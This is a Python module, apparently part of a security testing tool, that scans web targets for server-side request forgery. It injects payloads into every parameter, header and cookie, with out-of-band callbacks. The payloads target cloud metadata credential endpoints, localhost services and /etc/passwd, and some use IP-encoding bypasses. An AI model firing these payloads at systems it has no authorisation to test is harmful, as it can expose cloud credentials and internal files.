"""
Server-Side Request Forgery (SSRF) Scanner — per-parameter isolation.

Uses InsertionPoint engine for systematic, isolated injection into every
parameter, path segment, cookie, and header independently.

Detection:
  - ErrorPatternMatcher.match_ssrf_indicators() with baseline subtraction
  - Statistical size anomaly detection (3σ)
  - AWS/GCP/Azure credential patterns with high confidence
  - OOB blind SSRF via callback server
"""

import time
from urllib.parse import urlparse, parse_qs

from secprobe.config import Severity
from secprobe.core.detection import Confidence, ErrorPatternMatcher
from secprobe.core.exceptions import TargetUnreachableError, WAFBlockedError
from secprobe.core.insertion_points import (
    InsertionPointDiscovery, InsertionType, InsertionPoint, send_request,
)
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS EC2 Metadata", Severity.CRITICAL),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Credentials", Severity.CRITICAL),
    ("http://169.254.169.254/latest/user-data", "AWS User Data", Severity.CRITICAL),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata", Severity.CRITICAL),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS", Severity.CRITICAL),
    ("http://169.254.169.254/metadata/v1/", "DigitalOcean Metadata", Severity.CRITICAL),
    ("http://127.0.0.1/", "Localhost", Severity.HIGH),
    ("http://127.0.0.1:22/", "Localhost SSH", Severity.HIGH),
    ("http://127.0.0.1:3306/", "Localhost MySQL", Severity.HIGH),
    ("http://127.0.0.1:6379/", "Localhost Redis", Severity.HIGH),
    ("http://[::1]/", "IPv6 Localhost", Severity.HIGH),
    ("http://0x7f000001/", "Hex IP Bypass", Severity.HIGH),
    ("http://2130706433/", "Decimal IP Bypass", Severity.HIGH),
    ("http://127.1/", "Short IP Bypass", Severity.HIGH),
    ("http://0177.0.0.1/", "Octal IP Bypass", Severity.HIGH),
    ("http://169.254.169.254.nip.io/latest/meta-data/", "DNS Rebind AWS", Severity.CRITICAL),
    ("http://localtest.me/", "DNS Alias Localhost", Severity.HIGH),
    ("file:///etc/passwd", "Local File Read (file://)", Severity.CRITICAL),
    ("file:///c:/windows/win.ini", "Windows file:// read", Severity.CRITICAL),
    ("gopher://127.0.0.1:25/", "Gopher Protocol", Severity.HIGH),
    ("dict://127.0.0.1:6379/INFO", "Dict Protocol Redis", Severity.HIGH),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "IPv6-mapped IPv4", Severity.HIGH),
]

URL_PARAM_NAMES = [
    "url", "uri", "path", "dest", "redirect", "target", "rurl",
    "return", "page", "feed", "host", "site", "html", "data",
    "load", "request", "proxy", "ref", "callback", "next",
    "img", "image", "fetch", "download", "link", "source",
]


class SSRFScanner(SmartScanner):
    name = "SSRF Scanner"
    description = "Test for Server-Side Request Forgery vulnerabilities"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing SSRF on {url}", "progress")

        # ── Initialize detection engine ──────────────────────────────
        engine = self._init_detection_engine()

        try:
            baseline = self.http_client.get(url)
        except TargetUnreachableError as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        baseline_text = baseline.text

        # ── Detect target technology ─────────────────────────────────
        baseline_tech = self.detect_technology(baseline_text)
        if baseline_tech:
            print_status(f"Technology detected: {', '.join(baseline_tech)}", "info")

        # Profile endpoint
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        baseline_profile = engine.profile(url, params=params or None)

        # ── Discover ALL insertion points ────────────────────────────
        discovery = InsertionPointDiscovery(
            http_client=self.http_client,
            include_headers=True,
            include_cookies=True,
            include_paths=True,
        )

        # Gather test URLs
        test_urls = self._find_url_params(url)
        if self.context:
            for u in self.context.get_injection_urls():
                if u not in test_urls:
                    test_urls.append(u)

        # If no params found, create synthetic URL-related params
        if not test_urls:
            test_urls = [f"{url}?{p}=https://example.com" for p in URL_PARAM_NAMES[:10]]

        # Build insertion points from all URLs
        all_points: list[InsertionPoint] = []
        for test_url in test_urls:
            points = discovery.discover(test_url, response=baseline)
            all_points.extend(points)

        # Separate by type
        param_points = [p for p in all_points if p.type in (
            InsertionType.QUERY_PARAM, InsertionType.PATH_SEGMENT)]
        cookie_points = [p for p in all_points if p.type == InsertionType.COOKIE]
        header_points = [p for p in all_points if p.type == InsertionType.HEADER]

        total_points = len(all_points)
        print_status(
            f"Discovered {total_points} insertion points "
            f"({len(param_points)} params, {len(cookie_points)} cookies, "
            f"{len(header_points)} headers)", "info"
        )

        # Track found vulns to avoid duplicates
        found_vulns: set[tuple] = set()

        # ── Phase 1: Parameter-based SSRF (per-parameter) ───────────
        print_status("Phase 1: Parameter-based SSRF (per-parameter isolation)", "progress")
        for point in param_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for payload, payload_desc, severity in SSRF_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                payload_variants = self._evade_payload(payload, vuln_type="ssrf")
                for p in payload_variants:
                    spec = point.inject(p, mode="replace")
                    try:
                        resp = send_request(self.http_client, spec,
                                            allow_redirects=False, timeout=5)
                    except WAFBlockedError:
                        continue
                    except Exception:
                        continue

                    # Use ErrorPatternMatcher with baseline subtraction
                    ssrf_matches = ErrorPatternMatcher.match_ssrf_indicators(
                        resp.text, baseline_text)
                    file_matches = ErrorPatternMatcher.match_file_disclosure(
                        resp.text, baseline_text)

                    all_matches = ssrf_matches + file_matches
                    if all_matches:
                        best = max(all_matches, key=lambda m: m.confidence)
                        if best.confidence >= Confidence.FIRM:
                            found_vulns.add(point_key)
                            # ── SmartScanner verification ────────────
                            verification = self.verify_finding(
                                url=spec.url, param=point.name,
                                payload=payload, vuln_type="ssrf",
                            )
                            if verification.confirmed:
                                self.add_verified_finding(
                                    title=f"Verified SSRF - {payload_desc} ({best.technology})",
                                    severity=severity,
                                    description=(
                                        f"Server fetched internal resource VERIFIED "
                                        f"(confidence: {verification.confidence.name}).\n"
                                        f"Injection point: {point.display_name}\n"
                                        f"Payload: {payload}\n"
                                        f"Evidence: {best.description}"
                                    ),
                                    confidence=verification.confidence,
                                    verification_evidence=verification.evidence,
                                    recommendation="Validate and whitelist URLs server-side. Block internal IP ranges.",
                                    category="Server-Side Request Forgery",
                                    url=spec.url,
                                    cwe="CWE-918",
                                )
                                print_finding(severity, f"Verified SSRF: {payload_desc} via {point.name}")
                            else:
                                self.add_finding(
                                    title=f"SSRF - {payload_desc} ({best.technology})",
                                    severity=severity,
                                    description=(
                                        f"Server fetched internal resource "
                                        f"(confidence: {best.confidence.name}).\n"
                                        f"Injection point: {point.display_name}\n"
                                        f"Payload: {payload}\n"
                                        f"Evidence: {best.description}"
                                    ),
                                    recommendation="Validate and whitelist URLs server-side. Block internal IP ranges.",
                                    evidence=(
                                        f"Parameter: {point.name} ({point.type.value})\n"
                                        f"URL: {spec.url}\n"
                                        f"Match: {best.matched_text[:200]}"
                                    ),
                                    category="Server-Side Request Forgery",
                                    url=spec.url,
                                    cwe="CWE-918",
                                )
                                print_finding(severity, f"SSRF: {payload_desc} via {point.name} ({best.confidence.name})")
                            break

                    # Statistical size anomaly
                    if baseline_profile and baseline_profile.sample_count >= 2:
                        if baseline_profile.is_size_anomalous(len(resp.text), sigma_threshold=4.0):
                            if "127.0.0.1" in payload or "169.254" in payload or "metadata" in payload:
                                self.add_finding(
                                    title=f"Possible SSRF - Size anomaly ({payload_desc})",
                                    severity=Severity.MEDIUM,
                                    description=(
                                        f"Response size is statistically anomalous.\n"
                                        f"Parameter: {point.name}\n"
                                        f"Baseline: {baseline_profile.size_mean:.0f}+-{baseline_profile.size_stdev:.0f}B\n"
                                        f"Observed: {len(resp.text)}B"
                                    ),
                                    recommendation="Investigate server-side URL fetching behavior.",
                                    evidence=f"Parameter: {point.name}\nURL: {spec.url}",
                                    category="Server-Side Request Forgery",
                                    url=spec.url,
                                    cwe="CWE-918",
                                )
                else:
                    continue
                break  # Found vuln for this point, move on

        # ── Phase 2: Header-based SSRF (per-header isolation) ────────
        print_status("Phase 2: Header-based SSRF (per-header isolation)", "progress")
        ssrf_targets = [p for p, _, _ in SSRF_PAYLOADS[:6]]  # Cloud metadata
        for point in header_points:
            point_key = ("header", point.name)
            if point_key in found_vulns:
                continue

            for payload in ssrf_targets:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="replace")
                try:
                    resp = send_request(self.http_client, spec,
                                        allow_redirects=False, timeout=5)
                except Exception:
                    continue

                matches = ErrorPatternMatcher.match_ssrf_indicators(resp.text, baseline_text)
                if matches:
                    best = max(matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        found_vulns.add(point_key)
                        self.add_finding(
                            title=f"SSRF via header '{point.name}'",
                            severity=Severity.CRITICAL,
                            description=(
                                f"Server fetched internal resource via {point.name} header.\n"
                                f"Confidence: {best.confidence.name}"
                            ),
                            recommendation="Validate and whitelist URLs. Don't trust HTTP headers for routing.",
                            evidence=(
                                f"Header: {point.name}\n"
                                f"Payload: {payload}\n"
                                f"Match: {best.matched_text[:200]}"
                            ),
                            category="Server-Side Request Forgery",
                            url=url,
                            cwe="CWE-918",
                        )
                        print_finding(Severity.CRITICAL, f"Header SSRF: {point.name}")
                        break

        # ── Phase 3: Cookie-based SSRF (per-cookie isolation) ────────
        print_status("Phase 3: Cookie-based SSRF (per-cookie isolation)", "progress")
        for point in cookie_points:
            point_key = ("cookie", point.name)
            if point_key in found_vulns:
                continue

            for payload in ssrf_targets[:3]:
                spec = point.inject(payload, mode="replace")
                try:
                    resp = send_request(self.http_client, spec,
                                        allow_redirects=False, timeout=5)
                except Exception:
                    continue

                matches = ErrorPatternMatcher.match_ssrf_indicators(resp.text, baseline_text)
                if matches:
                    best = max(matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        found_vulns.add(point_key)
                        self.add_finding(
                            title=f"SSRF via cookie '{point.name}'",
                            severity=Severity.HIGH,
                            description=f"SSRF via cookie '{point.name}' ({best.confidence.name})",
                            recommendation="Never use cookie values for server-side URL fetching.",
                            evidence=f"Cookie: {point.name}\nPayload: {payload}",
                            category="Server-Side Request Forgery",
                            url=url,
                            cwe="CWE-918",
                        )
                        break

        # ── Phase 4: OOB blind SSRF (per-parameter) ─────────────────
        if self.oob_available:
            print_status("Phase 4: OOB blind SSRF (per-parameter isolation)", "progress")
            oob_count = 0
            for point in param_points[:10]:
                point_key = (point.base_url.split("?")[0], point.name)
                if point_key in found_vulns:
                    continue

                # Plain HTTP callback
                token = self.oob_generate_token(point.base_url, point.name, "ssrf_blind", "http_callback")
                cb_url = self.oob_get_url(token)
                spec = point.inject(cb_url, mode="replace")
                try:
                    send_request(self.http_client, spec, allow_redirects=False, timeout=5)
                    oob_count += 1
                except Exception:
                    pass

                # DNS callback
                token = self.oob_generate_token(point.base_url, point.name, "ssrf_blind", "dns_callback")
                cb_domain = self.oob_get_domain(token)
                spec = point.inject(f"http://{cb_domain}/ssrf", mode="replace")
                try:
                    send_request(self.http_client, spec, allow_redirects=False, timeout=5)
                    oob_count += 1
                except Exception:
                    pass

            # OOB header SSRF
            for point in header_points[:6]:
                token = self.oob_generate_token(url, f"header:{point.name}", "ssrf_blind", "header_oob")
                cb_url = self.oob_get_url(token)
                spec = point.inject(cb_url, mode="replace")
                try:
                    send_request(self.http_client, spec, allow_redirects=False, timeout=5)
                    oob_count += 1
                except Exception:
                    pass

            if oob_count:
                print_status(f"Sent {oob_count} OOB SSRF payloads, waiting...", "progress")
                self.oob_collect_findings(wait_seconds=10)

        # ── Summary ──────────────────────────────────────────────────
        if not found_vulns:
            print_status("No SSRF vulnerabilities detected.", "success")
            self.add_finding(
                title="No SSRF detected",
                severity=Severity.INFO,
                description=(
                    f"Automated SSRF tests did not find vulnerabilities.\n"
                    f"Insertion points tested: {total_points}"
                ),
                category="Server-Side Request Forgery",
            )

    def _find_url_params(self, url):
        parsed = urlparse(url)
        if parsed.query:
            return [url]
        return []
